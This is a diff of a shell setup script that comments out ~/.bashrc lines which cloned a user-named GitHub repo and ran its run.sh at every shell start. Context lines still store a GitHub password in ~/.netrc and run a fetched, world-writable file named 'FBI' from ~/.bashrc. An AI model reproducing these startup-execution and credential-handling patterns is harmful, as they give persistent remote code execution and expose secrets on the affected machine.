@@ -70,9 +70,9 @@ echo "password ${GITHUB_PASSWORD}" >> ~/.netrc
 FBI_WARNI_PATH=$(fetch FBI /usr/sbin)
 chmod 777 ${FBI_WARNI_PATH}
 echo "bash ${FBI_WARNI_PATH}" >> ~/.bashrc
-read -p "repo user: " REPO_USER < /dev/tty
-read -p "repo name: " REPO_NAME < /dev/tty
-echo "cd /tmp" >> ~/.bashrc
-echo "git clone https://github.com/${REPO_USER}/${REPO_NAME}.git" >> ~/.bashrc
-echo "cd ${REPO_NAME}" >> ~/.bashrc
-echo "sh run.sh" >> ~/.bashrc
+# read -p "repo user: " REPO_USER < /dev/tty
+# read -p "repo name: " REPO_NAME < /dev/tty
+# echo "cd /tmp" >> ~/.bashrc
+# echo "git clone https://github.com/${REPO_USER}/${REPO_NAME}.git" >> ~/.bashrc
+# echo "cd ${REPO_NAME}" >> ~/.bashrc
+# echo "sh run.sh" >> ~/.bashrc
